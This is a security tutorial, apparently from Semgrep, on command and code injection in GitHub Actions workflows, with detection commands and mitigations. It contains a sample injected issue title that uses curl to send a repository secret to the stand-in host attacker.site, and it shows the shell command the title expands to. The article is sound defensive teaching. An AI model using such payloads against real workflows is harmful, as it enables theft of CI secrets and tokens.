---
title: Command Injection in GitHub Actions
description: Learn about GitHub Action Injection vulnerabilities
hide_title: false
displayed_sidebar: learnSidebar
slug: /learn/vulnerabilities/command-injection/github-actions-injection
tags:
  - command-injection
---


# Injection Attacks in GitHub Actions

A user opens a GitHub issue titled `"; curl http://attacker.site?token=${{ secrets.SERVICE_SECRET }}; x="`, and a few seconds later, your GitHub Actions runner silently executes it. Just like that, a secret is exfiltrated. This isn’t hypothetical—this is a textbook example of [command injection](overview) in GitHub Actions.

Modern CI/CD pipelines like GitHub Actions automate everything from testing and building to deploying production code. But when workflows are written insecurely, they can become an attacker’s playground. This risk is especially relevant when user-supplied data flows directly into commands or scripts.

There are also potential for [code injection](../code-injection/overview) where instead of executing a command, source code is included in the configuration to run. So both command and code injection have a common security vulnerability theme, untrusted user input including in GitHub Actions workflows can lead to exfiltrating tokens, compromising infrastructure, or creating releases to distribute malware.

In this article, we’ll break down how command and code injection can happen in GitHub Actions, explore common attack patterns, show how to detect it in code, and end with practical advice to avoid these issues in your own workflows.

## GitHub Actions Fundamentals

GitHub Actions is a CI/CD platform built directly into GitHub. At its core, a workflow is defined in a YAML file located in the `.github/workflows/` directory of a repository. Each workflow is made up of jobs, and each job typically has a *runner* which provides services to execute the job typically in a container environment. Jobs may contain multiple *steps*, which run shell commands, execute scripts, or trigger external actions. 

A typical example might look like this:

```yaml
on: pull_request
name: my-workflow
jobs:
  my_job:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Hello Semgrep!"
```

Workflows can be triggered by a wide range of events, including issue creation, pull requests, pushes, and even comments. Every trigger includes a payload of metadata—such as issue titles or pull request branch names—that teams often use inside the workflow using templating syntax like `${{ github.event.issue.title }}`.

This convenience is also where the risks begin.

## Common GitHub Actions Attacks

Let's look at some common injection attacks that can happen with GitHub Actions.

### Command Injection within GitHub Actions

A workflow might include a step like this:

```yaml
- run: echo "${{ github.event.issue.title }}"
```

This command looks innocent—it just echoes the issue title to the console. This is unsafe because `github.event.issue.title` comes from a user input field and is inserted directly into a shell command. A bad actor could open an issue in a public repo and any input they use for the title of the issue is inserted directly into the shell command.

For example, a title like this:

```
"; curl http://attacker.site?token=${{ secrets.SERVICE_SECRET }}; x="
```

Would result in the following shell execution:

```bash
echo ""; curl http://attacker.site?token=... ; x=""
```

This effectively leaks the secret token to an external server. Typically this might be combined with a `sleep` so that there is an opportunity for the attacker to delay the workflow and use the temporary token with malicious intent.

Look for untrusted data sources—like issue titles, branch names, comments or pull request metadata—being inserted into shell commands or scripts. 

### Code Injection in Builds with GitHub Actions

To catch this kind of issue, you need to understand both the **source** of the data (where it comes from) and the **sink** (where it’s used). When untrusted input reaches a code execution point like `run`, `script`, or a third-party action’s `args`, it becomes an injection risk. Care should also be taken when `uses` pulls in workflow dependencies like `run-scripts` may come from third-parties.

Here is an example of a workflow that allows the attacker to inject code through a regular pull request anticipating installation which could run any arbitrary code. 

```jsx
name: On Pull Request
on: pull_request
jobs:
  job1:
    steps:
    - name: Checkout
      uses: actions/checkout
    - name: Install
      uses: npm install
```

This example is for a JavaScript build but could also have been a PHP `composer`, Java `maven`, Python `pip install`, and many more package managers with a similar technique.

The attacker can include scripts in the **package.json** build pipeline:

```jsx
{
  "scripts": {
    "preinstall": "echo 'PWN!'"
  }
}
```

With access to the filesystem, the .git/config can access the repository token and send it to a server.

## Detecting GitHub Actions Vulnerabilities

Semgrep can help identify injection patterns across large codebases. You can use the [p/github-actions](https://semgrep.dev/p/github-actions) ruleset to find common GitHub Actions misconfigurations, including:

- Command injection via `run` shell execution
- Unsafe code injection triggers like `pull_request_target` with write permissions

To scan your workflows run:

```bash
semgrep --config p/github-actions
```

These rules are also included in the `--config p/default` ruleset to help detect issues.

## Recommendations & Mitigations

Some examples and tips to reduce the risk of command injection and related risks in your GitHub Actions workflows.

### Use Environment Variables Instead of Raw User Input

Instead of inserting untrusted values directly into `run`, assign them to environment variables:

**Unsafe:**

```yaml
- run: echo "${{ github.event.issue.title }}"
```

**Safe:**

```yaml
- name: echo-title
  env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "$TITLE"
```

This prevents premature evaluation and treats the input as literal strings which will be escaped rather than executable code.

### Minimize Permission Settings

Set job-level permissions to `read` by default, especially when handling untrusted inputs:

```yaml
permissions:
  contents: read
```

Avoid using event types like `pull_request_target` unless absolutely necessary, as it grants write permissions to the `GITHUB_TOKEN` by default. 

For any secrets configured, limit their access from org-wide level whenever it is not necessary. Branch protection rules can also be effective of limiting permissive settings that can be detected before being exploited.

### Separate Untrusted Code Execution

If you need to compile or execute third-party code (like running tests or installing packages from a pull request), isolate that logic in a separate job with minimal permissions. Use job outputs or artifacts to pass the results to a privileged job that performs actions like approving pull requests.

```yaml
name: Delegate Privileged Jobs
on: pull_request
jobs:
  build:
    name: Unprivileged Build Job
    permissions:
      contents: read
    steps:
      - name: checkout
        uses: actions/checkout@v3
      - name: install 
        run: npm install

  approve:
    name: Privileged Approval Job
    needs: build
    permissions:
      pull-requests: write
    steps:
      - name: Approve PR
        run: ./approve_PR
```

### Don’t Trust User Input from Public Events

Treat all input from issue titles, comments, and forked pull requests as tainted. Validate or sanitize them before use, or avoid inserting them into command-line contexts altogether.

## Conclusion

GitHub Actions provides helpful automation, but executing CI/CD operations comes with risks. If user-controlled input is inserted into commands without protection, attackers can run their own code in your CI/CD environment. At best, this leads to wasted resources. At worst, it exposes tokens, secrets, and codebases to compromise.

In this article, we explored how command injection happens in GitHub Actions, what it looks like in real workflows, and how to detect and prevent it. The most effective mitigation is simple: **don’t let user input get evaluated as code**.